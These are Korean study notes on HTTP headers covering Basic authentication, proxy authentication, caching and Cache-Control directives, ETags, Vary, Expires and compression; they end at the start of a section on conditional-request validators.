# HTTP Header

## HTTP Header 종류

- General header : 요청 및 응답에 적용된다. 데이터와 직접적인 관련은 없다.
- Request header : 요청할 리소스와 클라이언트 정보가 포함되어 있다.
- Response header : 응답에 관한 추가 정보가 포함되어 있다.
- Entity header : 엔티티 정보에 대한 추가 정보가 포함되어 있다. 

## 프록시를 처리에 대한 분류

## 1. end to end

- 최종 수신자에게 전달되어야 한다. 
- 프록시는 수정되지 않은 해당 정보를 재전송 한다. 
- 캐시는 해당 정보를 가지고 있다.

## 2. hop by hop

- 단일 전송에 대해서만 의미가 있다. 
- Connection, Keep-Alive, Authenticate, Proxy-Athorization, TE, Trailer, Transfer-Encoding, Upgrade이 포함된다. 

## HTTP Authentication

- HTTP는 액세스 인증과 제어를 위한 프레임워크를 제공한다. 
- 가장 일반적인 방식으로 "Basic"방식을 이용한다. 

## 일반적인 HTTP 인증 프레임워크

- RFC7235는 서버에 의해 클라이언트 요청을 시도하고, 클라이언트에 의해 인증정보를 제공하기 위해 사용될 수 있는 HTTP 인증 프레임워크를 정의한다. 
- 서버는 클라이언트에서 401 응답 코드를 가지고 응답하며, 최소한 한번의 시도에 포함된 WWW-Authenticate 응답 헤더로 권한을 부여하는 방법에 대한 정보를 제공한다. 
- 서버와 인증을 하기 원하는 클라이언트는 Authorization 요청 헤드 필더에 인증 정보를 포함함으로써 인증을 수행할 수 있다. 
- 클라이언트는 대개 사용자에게 비밀번호 프롬프트를 표시할 것이고 정확한 Authorization 헤더를 포함하는 요청을 만들 것이다. 
- Basic 인증일 경우, 교환의 안전을 위해 HTTPS(TLS) 연결 위에서 발생하여야 한다. 

## 프록시 인증

- 동일한 시도 및 응답 매커니즘이 프록시 인증을 위해서도 사용될 수 있다. 
- 이 경우, 이것은 인증을 요구하는 중간 프록시이다. 
- 리소스 인증 및 프록시 인증은 함께 존재할 수 있기 때문에, 헤더와 상태 코드의 다른 세트가 필요하다.
- 프록시의 경우 요청에 대한 상태 코드는 407이고, Proxy-Authonticate 응답 헤더는 프록시에 적용 가능한 최소한 하나의 요청을 포함하며, Proxy-Authorization 요청 헤더는 프록시 서버에 인증 정보를 제공하기 위해 사용된다. 

## 접근 거부

- (프록시)서버가 주어진 리소스에 대한 접근 권한을 얻기 위해 적절하지 않은 유효한 인증 정보를 수신한다면, 서버는 403 상태 코드로 응답하여야 한다. 
- 401, 407과 다르게 해당 사용자에 대한 인증은 불가능하다.

## WWW-Authenticate와 Proxy-Athenticate헤더

- WWW-Authenticate와 Proxy-Athenticate 응답 헤더는 자원에 대한 엑세스를 얻기 위해 사용되어야 할 인증 방법을 정의한다. 
- 이들은 인증을 하려는 클라이언트가 인증 정보를 제공할 방법을 알기 위해, 어떤 인증 스킴이 사용될 것인지를 구체적으로 적을 필요가 있다. 

## Authorization과 Proxy-Authorization헤더

- Authorization과 Proxy-Authorization 요청 헤더는 사용자 에이전트가 (프록시) 서버에 인증을 하기 위한 인증 정보를 포함한다. 
- 여기에서 type은 다시 한 번 필요하며 credentials이 뒤에 따라온다.
- credentials 부분은 어떤 인증 스킴이 사용되는지에 따라 인코딩이 되어 있거나 암호화가 되어 있을 수 있다. 

## Basic 인증 스킴

- base64를 이용하여 인코딩된 사용자 ID/비밀번호 쌍의 인증 정보를 전달한다. 

## Basic 인증의 보안

- 사용자 ID와 비밀번호가 평문으로 네트워크를 통해 전달되기 때문에, Basic 인증 스킴은 안전하지 않다. 
- HTTPS/TLS는 basic 인증과 함께 사용되어야 한다. 
- 이러한 추가적인 보안상의 향상이 없이는, basic 인증은 민감하거나 귀중한 정보를 보호하는데 사용되서는 안된다. 


## Authentication headers

## 1. WWW-Authenticate

- response header
- 리소스에 접근하는데 필요한 인증 메소드를 정의한다. 
- 함께 전송되는 응답은 401 Unauthorized response이다. 

~~~
// Syntax

WWW-Authenticate: <type> realm=<realm> charset = <charset>
~~~

- '<type>'은 인증 유형이며 기본 값은 Basic이다.
- 'realm=<realm>'은 protected area에 대한 설명이다. 정의되어 있지 않다면 hostname이 표시된다. 또한 어떤 공간에 사용자가 접근하려고 시도하는지 알리기 위하여, "중간 단계의 사이트에 대한 접근"과 같거나 또는 비슷한 메시지가 될 수 있다. 
- 'charset = <charset>'은 사용자 이름과 암호를 제출할 때 서버가 선호하는 인코딩 체계를 알린다. 허용되는 유일한 값은 'UTF-8'이다.

~~~
//Example

WWW-Authenticate: Basic

WWW-Authenticate: Basic realm="Access to the staging site", charset="UTF-8"
~~~

## 2. Authorization

- request header
- 서버의 사용자 에이전트임을 증명하는 자격을 포함하며, 보통 401 Unauthorized 상태를 WWW-Authenticate에 알려준 이후에 나온다. 

~~~
// Syntax

Authorization: <type> <credentials>
~~~

- '<type>'은 인증 타입이다. 보통 타입은 Basic이다. 
- '<credentials>'은 만약 type으로 Basic이 사용되었다면 증명은 다음과 같다.
    - 사용자 명과 비밀번호가 콜론을 이용하여 합쳐진다. 
    - 그 결과를 문자열에 base64로 인코딩한다.(base64는 문자를 그대로 보내는 것과 같다. )

~~~
// Example

Authorization: Basic YWxhZGRpbjpvcGVuc2VzYW1l
~~~

## 3. Proxy-authenticate

- response header
- 프록시 서버 뒤의 리소스에 엑세스하는 데 사용해야하는 인증 방법을 정의한다. 
- 407 Proxy Authentication Required가 함께 전송된다. 

~~~
// Syntax

Proxy-Authenticate: <type> realm=<realm>
~~~

- '<type>'은 인증 유형이다. 기본 타입은 Basic이다. 
- 'realm=<realm>'은 protected area에 대한 설명이다. 정의되어 있지 않다면 hostname이 표시된다. 

~~~
// Example

Proxy-Authenticate: Basic

Proxy-Authenticate: Basic realm="Access to the internal site"
~~~

## 4 Proxy-Authorization

- Request header
- 프록시 서버에서의 사용자 에이전트 자격 증명에 대한 내용을 포함한다. 
- 보통 Proxy-authenticate 헤더와 407 Authentication Requred가 서버로부터 응답된 이후에 나타난다. 

~~~
// Syntax

Proxy-Authorization: <type> <credentials>
~~~

- '<type>'은 인증 유형이다. 기본 타입은 Basic이다. 
- '<credentials>'은 만약 type으로 Basic이 사용되었다면 증명은 다음과 같다.
    - 사용자 명과 비밀번호가 콜론을 이용하여 합쳐진다. 
    - 그 결과를 문자열에 base64로 인코딩한다.(base64는 문자를 그대로 보내는 것과 같다. )

## Cashing

- 웹 사이트와 애플리케이션의 성능은 이전에 가져온 리소스들을 재사용함으로써 현저하게 향상될 수 있다. 
- 웹 캐시는 레이턴시와 네트워크 트래칙을 줄여주므로 리소스의 표현에 필요로 하는 시간을 줄인다. 
- HTTP 캐시 사용을 활용하여, 웹 사이트를 좀 더 잘 반응하도록 만들 수 있다. 

## 다른 종류의 캐시들

- 캐싱은 주어진 리소스의 복사본을 저장하고 요청 시에 그것을 서브하는 기술이다. 
- 웹 캐시가 자신의 저장소 내의 요청된 리소스를 가지고 있다면, 요청을 가로채 원래의 서버로부터 리소스를 다시 다운로드하는 대신 리소스의 복사본을 반환한다. 
- 이것은 다음과 같은 몇 가지 목표를 달성하게 해준다.
    - 모든 클라이언트를 서브할 필요가 없어진 서버의 로드량이 여유로워진다.
    - 클라이언트에 더 가까워지게 되므로 성능이 향상된다. 
    - 리소스를 회신하는데 더 적은 비용이 들게 된다. 
    - 하나의 웹 사이트에 대해, 캐싱이 높은 성능 달성에 중요한 컴포넌트이다.
    - 리소스는 영원히 변하지 않는 것이 아니므로 캐시 자원을 변하기 전까지 유지하는 것이 중요하다.

- 캐시에는 몇 가지 종류가 있으며 크게 두 분류로 묶을 수 있다. 
    1. 사설 브라우저 캐시
    2. 공유 프록시 캐시
    이외에도 게이트웨이 캐시, CDN, 리버스 프록시 캐시 그리고 로드 밸랜서 등이 있다. 

## 1. 사설 브라우저 캐시

- 단일 사용자에게 초점이 맞춰져 있다. 
- 브라우저 캐시는 사용자에 의하여 HTTP를 통해 다운로드된 모든 문서들을 가지고 있다. 
- 서버에 대한 추가적인 요청없이 뒤로 가거나 앞으로 가기, 저장, 소스로 보기 등을 위해 이용 가능한 방문했던 문서들을 만드는데 사용된다. 
- 캐시된 컨텐츠의 오프라인 브라우징을 개선시킨다. 

## 2. 공유 프록시 캐시

- 한 명 이상의 사용자에 의해 재사용되는 응답을 저장하는 캐시이다. 
- 예를 들어, 당신의 회사의 ISP는 많은 사용자들을 서브하기 위해 지역 네트워크 기반의 일부분으로써 웹 프록시를 설치해뒀을 수도 있는데, 그 덕분에 조회가 많이 되는 리소스들은 몇 번이고 재사용되어 네트워크 트래픽과 레이턴시를 줄여준다. 

## 캐싱 동작의 대상

- HTTP 캐싱은 부가적이지만 캐시된 리소스를 재상용하는 것은 보통 바람직한 일이다. 
- 하지만, 일반적인 HTTP 캐시들은 GET에 대한 응답을 캐싱하는 것으로 제한되며 다른 메서드들은 제외될 것이다.
- 일차 캐시 키는 요청 매서드 그리고 대상 URI로 구성된다.(종종 GET 요청으로만 사용되는 URI만이 캐싱의 대상이 되곤한다.)
- 일반적인 캐싱 엔트리의 폼은 다음과 같다.
    - 검색 요청의 성공적인 결과: HTML 문서, 이미지 록은 파일과 같은 리소스를 포함하는 GET 요청에 대한 200 (OK)응답
    - 영구적인 리다이렉트: 301(영구적으로 이동된) 응답
    - 오류 응답: 404(찾을 수 없음) 결과 페이지
    - 완전하지 않은 결과: 206(부분적인 컨텐츠) 응답
    - 캐시 키로 사용하기에 적절한 무언가가 정의된 경우의 GET 이외의 응답
- 캐시 엔트리는 요청이 컨텐츠 협상의 대상인 경우, 두번째 키에 의해 구별되는 다중 저장 응답으로 구성되어 있을 것이다. 

## 캐싱 제어

## 1. Cache-control 헤더
- Cache-Control HTTP/1.1 기본 헤더 필드는 요청과 응답 양측 모두에 있어 캐싱 메커니즘을 위한 디렉티브를 지정하는데 사용된다.
- 그것이 제공하는 여러 디렉티브들로 캐싱 정책을 정의하고자 한다면 이 헤더를 사용해야 한다.

### 캐시 스토리지 전혀 없음

- 캐시는 클라이언트 요청 혹은 서버 응답에 관해서 어떤 것도 저장해서는 안된다. 
- 요청은 서버 측으로 전송되고 전체 응답은 매번 그리고 항상 다운로드 한다. 

~~~
Cache-Control: no-store
Cache-Control: no-cache, no-store, must-revalidate
~~~

### 캐시하지 않음

- 캐시된 복사본을 사용자에게 보여주기 전에, 재검증을 위해 원 서버로 요청을 보낸다. 

~~~
Cache-Control: no-cache
~~~

### 사설 캐시와 공개 캐시

- '공개' 디렉티브는 응답이 어떤 캐시에 의해서든 캐시된다는 것을 가리킨다. 
- 이것은 HTTP 인증 혹은 보통 캐시 가능하지 않은 응답 상태 코드를 지닌 페이지가 캐시되어야 할 경우 유용할 수 있다. 
- 반면 "사설"은 응답이 단일 사용자를 위한 것이며 공유 캐시에 의해 저장되어서는 안된다는 것을 가리킨다. 

~~~
Cache-Control: private
Cache-Control: public
~~~

### 만료

- 여기서 가장 중요한 디렉티브는 "max-age=<second>"로 리소스가 유효하다고 판단되는 최대 시간을 말한다. 
- Expires와는 다르게, 이 디렉티브는 요청 시간과 관련이 있다. 
- 변경되지 않을 애플리케이션 내 파일에 대해, 보통 공격적인 캐싱을 추가할 수 있다. 
- 이것은 이미지, CSS 파일 그리고 자바스크립트 파일과 같은 정적 파일들을 포함한다. 

~~~
Cache-Control: max-age=31536000
~~~

### 검증

- 'must-revalidate' 디렉티브 사용 시, 캐시는 그것을 사용하기 이전의 오래된 리소스의 상태와 만료된 리소스가 사용되지 않았다는 것을 확실히 해두어야 한다. 

~~~
Cache-Control: must-revalidate
~~~

## 2. Pragma 헤더

- Pragma는 HTTP/1.0헤더로, HTTP 응답에 대해 특정되지 않으므로, Cache-Control 헤더 필드가 요청 내에서 생략되지 않은 경우, Cache-Control: no-cache와 동일하게 동작할지라고 일반적인 HTTP/1.1 Cache-Control 헤더에 대해 신뢰할 만한 대체 헤더는 아니다. 
- 하위 호완의 경우에만 사용할 것

## 유효함

- 리소스가 캐시 내에 저장되고 나면, 이론적으로는 영원히 캐시에 의해 서버될 수도 있다. 
- 캐시는 한정적인 캐시를 가지므로 아이템을은 주기적으로 스토리지에서 제거된다. 
- 이런 과정을 캐시 축출이라고 한다. 
- HTTP가 클라이언트-서버 프로토콜이므로, 리소스가 변경되었을 때 서버는 캐시와 클라이언트에 접근할 수 없다. 
- 그들은 리소스에 대한 만료 시간을 주고 받아야 한다. 
- 해당 만료 시간 이전에는, 리소스가 유효하다.
- 만료 시간 이후의 리소스는 실효된다. 
- 축출 알고리즘은 대게 실효된 리소스 이상의 권한을 유효한 리소스에게 준다. 
- 실효된 리소스는 축출되거나 무시되지 않는다. 
- 캐시가 실효된 리소스에 대한 요청을 받은 경우, 아직 유효한지 아닌지를 검사하기 위해 If-None-Match와 함께 전송한다. 
- 만약 그렇다면, 서버는 요청된 리소스 본문을 전송하지 않고 304 헤더를 돌려보내 대역폭을 절약한다. 
- 유효 수명은 몇가지 헤더에 근거해 계산된다. 
- "Cache-control: max-age=N" 헤더가 특정된 경우, 유효 수명은 N과 동일하다. 
- 만약 이 헤더가 없다면, Expires 헤더의 유무를 검사한다. 
- 존재한다면 그것의 값에서 Date 헤더의 값을 뺀 결과가 유효 수명이 된다. 
- 마지막으로, 그 헤더도 없다면, Last-Modified 헤더를 찾게된다.
- 이 헤더가 있다면, 캐시의 유효 수명은 Date 헤더 값에서 Last-modified 헤더 값을 뺀 값을 10으로 나눈 결과가 된다. 

~~~
expirationTime = responseTime(브라우저가 수신한 시간) + freshnessLifetime - currentAge
~~~

## 활성화된(Revved) 리소스

- 우리가 캐시된 리소스를 사용하면 사용할 수록, 웹 사이트의 응답성과 성능은 점점 더 조아질 것이다. 
- 이것을 최적화하기 위해 실제 방법은 만료 시간을 가능한 더 먼 미래로 설정하는 것이다. 
- 이것은 리소스를 정기적으로 혹은 자주 갱신함으로써 가능하지만, 아무 드물게 업데이트되는 리소스의 경우에는 이게 문제가 된다.
- 이런 리소스들은 캐시한 리소스로부터 최대한 활용되는 리소스들로, 앞서 얘기한 방법 덕분에 이러한 리소스들을 갱신하기 더 어렵게 된다. 
- 이것은 각 웹 페이지에 포함되고 링크된 기술적인 리소스들을 대표한다: 자바스크립트와 css 파일들의 변경은 드물지만, 그들이 변경될 때 빠르게 갱신되기를 원할 것이다. 

- 웹 개발자들은 Steve Sounders가 revving이라고 불렀던 기술을 발명했다.
- 드물게 업데이트되는 파일들은 명확한 방법으로 이름이 지어진다: 보통은 파일 이름인, 파일들의 URL에 수정(혹은 버전) 번호가 추가된다. 
- 그와 같이 해당 리소스의 각각의 새로운 수정본은 결코 변경되지 않으며 보통은 1년 혹은 그 이상의 아주 먼 미래에 만료될 수 있는 그 자체로 리소스로써 간주된다. 
- 새로운 버전들을 가지기 위해, 해당 리소스들과의 모든 연결은 모두 변경되어야 하며, 그것이 이 방법의 단점이다.: 이것은 보통 웹 개발자들이 사용하는 툴체인에 의해 다루어지는 추가적인 복잡함이다. 
- 드물게 변경되는 리소스들이 변경되는 경우 자주 변경되는 리소스에 추가적인 변화를 초래한다. 이런 리소스들이 읽혀지는 경우, 다른 리소스들의 새로운 버전들도 읽혀지게 된다. 

- 이 기술은 추가적인 이점도 가지고 있다: 동시에 캐시된 두 개의 리소스를 갱신하는 것은 한 리소스의 기한이 지난 버전이 다른 리소스의 새로운 버전과 함계 혼합되어 사용되는 경우를 초래할 것이다. 
- 이것은 웹 사이트가 상호 간의 의존성을 가지고 있는 CSS 스타일시트와 자바스크립트를 가지고 있는 경우 매우 중요하다. 

- 즉, 캐시를 최대한 활용하는 방법은 만료시간을 늘리는 것이다. 하지만 만료기간을 늘림으로 변경을 바로 보고 싶은 리소스의 경우 문제가 생길 수 있다. 변경이 드물지만 수정이 일어났을때 결과를 빨리 보고 싶을때 문제가 발생한다. 각 파일들에 버전 번호를 부여하여 업데이트를 관리한다.

## 캐시 검증

- 재검증은 사용자가 리로드 버튼을 누를 경우 촉발된다. 
- 재검증은 캐시된 응답이 "Cache-control: must-revalidate" 헤더를 포함하고 있는 경우 일반적인 브라우징 상태에서 촉발되기도 한다. 
- 또 다른 요인은 Advanced->Cache 환경설정 패널 내에 캐시 검증 환경 설정이다. 
- 거기에는 문서가 로드될 때마다 검증을 강제할 수 있는 옵션이 있다. 

- 캐시된 문서의 만료 시간이 가까워져오면, 문서가 검증되거나 가시 불러오게 된다. 
- 검증은 서버가 강한 검증 혹은 약한 검증 중 하나라도 제공하는 경우에만 일어날 수 있다. 

## 1. ETags

- ETag 응답 헤더는 강한 검증으로써 사용될 수 있는 사용자 에이전트에게 있어 불분명한 값이다. 
- 그것은 브라우저와 같은 HTTP 사용자 에이전트가 이 문자열이 무엇을 표현하는지 알 수 없고 그것의 값이 무엇이 될지를 예측할 수 없다는 것을 의미한다. 
- ETag 헤더가 리소스에 대한 응답의 일부라면, 클라이언트는 이후 요청의 헤더 내에(캐시된 응답을 검증하기 위해) If-None-Match 헤더를 발급할 수 있다. 

- Last-Modified 응답 헤더는 약한 검증으로써 사용될 수 있다. 
- 그것이 1초의 해상도만 가질 수 있기에 약하다고 간주된다. 
- Last-Modified 헤더가 응답 내에 나타나면 클라이언트는 캐시된 문서를 검증하기 위해 If-Modified-Since 요청 헤더를 발급할 수 있다. 

- 검증 요청이 이루어지면, 서버는 검증 요청을 일반적인 200 ok으로 요청과 응답을 무시하거나 브라우저에게 캐시된 복사본을 사용하도록 지시하기 위해 304 Not Modified(본문을 비워둔 상태로)를 반환할 수 있다. 
- 후자의 응답은 캐시된 문서의 만료 시간을 갱신하는 헤더를 포함할 수도 있다. 

## 상황에 따른 응답

- Vary HTTP 응답 헤더는 원 서버로부터 신선한 리소스를 요청하지 않고 캐시된 응답이 사용될 수 있는지를 결정하기 위해 이후의 요청 헤더를 일치시키는 방식을 결정한다. 
- 캐시가 Vary 헤더 필드를 지닌 캐시된 응답에 의해 만족될 수 있는 요청을 수신한 경우, Vary 헤더에 의해 지명된 모든 헤더 필드들이 원래의 (캐시된) 요청과 새로운 요청 모두와 일치하지 않는다면 그 캐시된 응답을 사용해서는 안된다. 

- 예를 들면, 이것은 컨텐츠를 동적으로 서브하는 경우에 유용할 수 있다. 
- Vary: User-Agent 헤더가 사용되는 경우, 캐싱 서버는 캐시로부터 페이지를 서브래야 할지를 결정할 때 사용자 에이전트를 고려해야 한다. 
- 만약 당신이 모바일 사용자에게 다른 컨텐츠를 서브하고 있다면, 그 헤더는 캐시가 모바일 사용자에게 사이트의 데스크톱 버전을 실수로 서브하는 일을 피하도록 도와줄 것이다. 
- 추가로, 구글과 다른 검색 엔진들이 페이지의 모바일 버전을 찾는데 도움을 줄 수 있으며, 그들에게 클로킹이 의도되지 않았다는 것을 알려준다

~~~
Vary: User-Agent
~~~

- User-Agent 헤더 값은 모바일과 데스크톱 클라이언트에 따라 다르므로, 캐시는 모바일 컨텐츠를 데스크톱 사용자에게 혹은 그 반대의 경우라도 실수로 서브하지 않을 것이다. 


## 1. age

- Response header
- 프록시 캐시 내에 초단위의 머무르는 시간을 나타낸다. 
- Age 헤더는 보통 0에 가깝다. 
- 만약 Age:0이라면, 원 서버로부터 받은 것이다. 
- 그게 아니라면, 프록시의 현재 시간과 HTTP 응답 내에 포함된 Date 일반 헤더의 차로 계산된다.

~~~
// Synctax
Age: <delta-seconds>
~~~

- '<delta-seconds>'는 음수가 아닌 정수형으로, 객체가 프록시 캐시 내에 머문 초단위 시간을 나타낸다. 

~~~
// Example
// Age: 24
~~~

## 2. Cache-Control

- General header
- 요청과 응답 내의 캐싱 메커니즘을 위한 디렉티브를 정의하기 위해 사용된다. 
- 캐싱 디렉티브는 단방향성이다. 
- 이는 요청 내에 주어진 디렉티브가 응답 내에 주어진 디렉티브와 동일하지 않다는 것을 의미한다. 

## Syntax

- 디렉티브는 대소문자를 구분하지 않으며 토큰과 따옴표로 둘러쌓인 문자열 문법 모두를 사용할 수 있는 부가적인 인자를 가진다. 
- 다중 디렉티브는 쉼표로 구분된다. 

## Cache request directives

~~~
Cache-Control: max-age=<seconds>
Cache-Control: max-stale[=<seconds>]
Cache-Control: min-fresh=<seconds>
Cache-Control: no-cache
Cache-Control: no-store
Cache-Control: no-transform
Cache-Control: only-if-cached
~~~

## Cache response directive

~~~
Cache-Control: must-revalidate
Cache-Control: no-cache
Cache-Control: no-store
Cache-Control: no-transform
Cache-Control: public
Cache-Control: private
Cache-Control: proxy-revalidate
Cache-Control: max-age=<seconds>
Cache-Control: s-maxage=<seconds>
~~~

## Extension Cache-Control directives

~~~
Cache-Control: immutable
Cache-Control: stale-while-revalidate=<seconds>
Cache-Control: stale-if-error=<seconds>
~~~

## 2.1 Derective

## 2.1.1. public

- 어떤 상황에서도, request에 max-age, expires 헤더가 없더라도 캐시된다는 것을 의미한다. 

## 2.1.2. private

- 단일 사용자를 위한 것이며 공유 캐시에 저장되지 말아야 한다는 것을 의미한다. 사설 캐시는 응답을 저장할 수도 있다. 

## 2.1.3. no-cache

- 캐시된 복사본을 사용자에게 보내주기 전에 원서버로 재검증을 위한 요청을 보낸다. 

## 2.1.4. only-if-cache

- 클라이언트가 오직 캐시에서만 데이터를 내려받는다. 더 최신 복사본이 있는지 서버에 요청해선 안된다. 

## 2.2 Experation

## 2.2.1. max-age=<seconds>

- 리소스가 최신 상태라고 판단할 시간을 지정한다. 이 디렉티브는 요청 시간과 관련이 있다. 

## 2.2.2. s-maxage=<seconds>

- max-age, Expires 헤더를 재정의한다.
- 사설 캐시에서는 무시되고 공유 캐시에서만 적용된다. 

## 2.2.3. max-stale[=<seconds>]

- 클라이언트가 캐시의 만료 시간을 초과한 응답을 받아들일지를 나타낸다. 
- 초단위 데이터를 받는데 이것은 결코 만료되어서는 안되는 시간을 나타낸다. 

## 2.2.4. min-fresh=<seconds>

- 지정된 시간동안 데이터가 신선한 상태로 유지된다. 


## 2.3 Revalidation and reloading

## 2.3.1. must-revalidate

- 캐시를 사용하기 전에 반드시 리소스 상태를 확인해야 한다. 
- 만료된 리소스를 사용해서는 안된다. 

## 2.3.2. proxy-revalidate

- must-revalidate와 동일하게 작동한다. 
- 공유 캐시에서만 작동한다. 

## 2.3.3. immutable

- 응답 본문이 변하지 않을 것을 의미한다. 
- 응답이 만료되지 않은 것이라면 서버상에서 변경되지 않을것이다. 
- 따라서, 클라이언트는 업데이트 검사를 위해 조건부의 재검증을 해서는 안된다.(If-None-Match, If-Modified-Since)
- 이 확장을 감지하지 못한 클라이언트는 HTTP 명세에 따라 그것을 무시해야 한다. 


## 2.4 Other

## 2.4.1. no-store

- 캐시는 요청이나 응답 모두 저장해서는 안된다. 

## 2.4.2. no-transform

- 응답에 대한 변형이 일어나선 안된다. 
- Content-Encoding, Content-Range, Content-Type 헤더는 프록시에 의해서 수정되어서는 안된다. 


## 3. Expires

- response header
- 응답의 만료 날짜/시간을 포함한다. 
- 0과 같은 유효하지 않은 과거의 시간을 나타내어 리소스가 이미 만료되었음을 의미한다. 
- 응답 내에 Cache-control 헤더(max-age, s-max-age)가 존재할 경우 Expires 헤더는 무시된다. 

~~~
// Syntax
Expires: <http-date>

// Example
Expires: Wed, 21 Oct 2015 07:28:00 GMT
~~~

## 3. Compression in HTTP

- 압축은 웹 성능을 높이는 중요한 방법이다. 
- 압축 매커니즘은 서버와 브라우저가 이미 잘 구현해두었다. 
    - 먼저 몇개의 파일 형식이 최적화된 특유의 방법으로 압축된다. 
    - 그런 뒤 HTTP 계층에서 일반적인 암호화가 일어난다. 
    - 그리고 마침내 압축이 HTTP 커넥션의 두 노드 사이의 커넥션 계층에서 정의 될 수 있다. 

## 3.1 File format compression

- 각각의 데이터 타입은 그 안에서 공간을 낭비하는, 몇 가지 중복을 가지고 있다. 
- 텍스트가 일반적으로 60% 정도의 중복을 가지고 있다면, 오디오와 비디오 같은 다른 미디어들에게 이 비율은 훨씬 더 높아질 수 있다. 
    - 무손실 압축(Lose-less compression)은 압축-비압축 사이클이 복원된 데이터를 변경하지 않는 것을 말한다. 원래의 데이터와 복원 데이터는 일치한다. 이미지에서는, gif 혹은 png가 무손실 압축을 사용한다. 
    - 손실 압축(Lossy compression)은 사용자가 인지하기 힘든 방법 내에서 원래의 데이터를 사이클이 변경하는 것을 말한다. 웹서에서의 비디오 포맷은 손실 압축이며, 이미지의 경우에는 jpeg가 그렇다. 
- 어떤 포맷들은 webp처럼 무손실 혹은 손실로 이용 가능하며, 일반적으로 손실 알고리즘은 그 과정이 무손실 혹은 좀 더 나은 품질을 이끌도록 좀 더 나은 혹은 무손실 압축을 가능하도록 구성될 수 있다. 
- 사이트의 좀 더 나은 성능을 위해, 수용 가능한 수준의 품질을 지키면서도 가능한 많이 압축하는 것이 이상적이다. 
- 이미지의 경우, 도구가 만들어 낸 이미지는 웹을 위해 충분히 최적화되지 않을 수도 있다. 
- 요구되는 품질을 유지하면서 가능한 많이 압축하는 도구를 사용하는 것을 추천한다. 
- 손실 압축 알고리즘은 무손실 압축 알고리즘보다 일반적으로 효율적이다. 

## 3.2 End-to-end compression

- 압축에 있어, 종단간 압축(end-to-end compression)은 웹 사이트의 가장 큰 성능 이득이 발생하는 곳이다. 
- 종단간 압축은 서버에 의해 처리되고 클라이언트에 도달할 때까지 결코 변하지 않을 메시지 바디의 압축을 나타낸다. 
- 중간 노드가 무엇이든지, 바디는 건들이지 않고 그대로 둔다. 
- 모든 모던 브라우저와 서버들은 종단간 압축을 지원한다. 
- 협상하는 유일한 것은 사용할 압축 알고리즘이다. 
- 이런 압축 알고리즘은 텍스트에 최적화되어 있다. 
- 1990년대에, 압축 기술은 급격한 속도로 진보되고 있었으며, 많은 수의 성공적인 알고리즘들이 선택 가능한 후보군에 추가되었다. 
- 오늘날에는, 오직 두 개의 알고리즘만이 적절한 후보군이다. 
- 가장 일반적인 gzip, 그리고 새로운 도전자인 br이 그것이다. 
- 사용할 알고리즘을 선택하기 위해, 브라우저와 서버는 사전 컨텐츠 협상을 사용한다. 
- 브라우저는 브라우저가 지원하는 알고리즘과 그것의 우선순위와 함께 Accept-Encoding 헤더를 전송한다. 
- 서버는 그 헤더를 뽑아내서 바디를 압축하는데 사용하고 서버가 선택할 알고지금을 Content-Encoding 헤더를 사용해 브라우저에게 알려준다. 
- 컨텐츠 협상이 그것의 인코딩에 근거한 표현을 선택하는데 사용되므로, 적어도 Content-Encoding을 포함하는 하나의 Vary 헤더가 반드시 응답 내 해당 헤더에 붙어 전송되어야 한다. 
- 그러한 방법으로, 캐시는 리소스의 다른 표현을 캐시하는게 가능하다. 
- 압축이 명확한 성능 향상을 가져다주므로, 모든 파일에 대한 활성화를 하는 것을 추천한다. 하지만 이미지, 오디오나 비디오와 같은 파일들을 이미 압축되어 있을 것이다. 

## 3.3 Hop-by-hop compression

- 종단간 압축과 비슷하기 하지만, 한 가지 필수적인 엘리먼트에 의해 차이가 난다. 
- 전송되게 될 구체적인 표현을 만들어내는, 서버 내에서 리소스에 대한 압축이 일어나지 않고, 클라이언트와 서버 사이의 경로 상에 있는 어떤 두 노드 사이에서 메시지의 바디에 압축이 일어난다. 
- 중간 노드 간의 커넥션들은 다른 압축을 적용할 수도 있다. 
- HTTP는 종단간 압축에서의 컨텐츠 협상과 유사한 메커니즘을 사용한다. 
- 요청을 전송하는 노드는 노드의 요청이 TE 헤더를 사용하고 있다는 것을 알려주고 다른 노드들은 알맞는 방법을 선택하여 적용하고 Transfer-Encoding 헤더를 사용해 선택한 내용을 가리킨다. 
- 실제로, hop-by-hop 압축은 서버와 클라이언트에게는 보이지 않으며 드물게 사용되고 있다. 
- TE 헤더와 Transfer-Encoding 헤더는 리소스의 길이를 알지 못한 상태로 전송을 시작하도록, 청크에 의해 응답을 전송하는데 대부분 사용된다. 
- Hop 계층에서 Transfer-Encoding 헤더와 압축을 사용하는 것은 보통 프록시 계층에서 적용된다. 


## 4. HTTP conditional requests

- 영향을 받는 리소스들을 검사기 값을 이용해 비교함으로써, HTTP는 성공인 경우라도 요청의 결과가 변경될 수 있는 조건부 요청(value of validator)의 컨셉을 가지고 있다. 
- 그런 요청들은 캐시 컨텐츠와 쓸모없는 컨트롤 회피를 검증하고, 다운로드를 이어서 하거나 서버 상의 문서를 업로드 또는 수정할 때 수정된 내요을 잃지 않도록 할 때처럼, 문서의 무결성을 확증하는데 유용할 수 있다. 

## 4.1 Principles

- HTTP 조건부 요청은 특정 헤더 값에 의존하여 기존과는 다르게 실행되는 요청이다. 
- 이 헤더들은 전제 조건을 정의하고 있으며 요청의 결과는 그 전제 조건이 일치하는지 아닌지에 따라 달라진다. 
 - 보통 문서를 가져오라고 하는 GET와 같은 safe 메서드의 경우, 오직 연관되어 있는 경우에 조건부 요청이 회신하는데 사용될 수 있으므로 대역폭을 아끼게 된다. 
 - 보통 문서를 업로드하는 PUT와 같은 unsafe 메서드들의 경우, 그 요청의 원본 문서가 서버에 저장되어 있는 것과 동일한 경우에만 조건부 요청이 문서 업로드에 사용될 수 있다. 

 ## 4.2 validators

 - 모든 조건부 요청들은 서버 상에 저장되어 있는 리소스가 특정 버전과 일치하는지를 검사하려고 한다. 
 - 이를 이루기 위해, 조건부 요청은 리소스의 버전을 명시할 필요가 있다. 
 - 전체 리소스를 바이트 대 바이트로 비교하는 것은 불가능하므로, 요청은 버전을 뜻하는 값을 함께 전송한다. 
 - validator는 두 종류가 있다. 
  - last-modified 날짜로, 문서의 최종 수정 일자를 말한다. 
  - entity tag 혹은 etag라고 부르는 각 버전을 고유하게 나타내는 읽을 수 없는 문자열이 있다. 
- 동일 리소스의 버전 비교는 약간 교묘하다. 
- 컨텍스트에 의존하여 두 종류의 동질성 검사를 한다. 
- 바이트 대 바이트의 동일성을 원한다면 강한 검사기(Strong validator)가 사용되는데, 예를 들어 다운로드를 이어할 때 사용된다. 
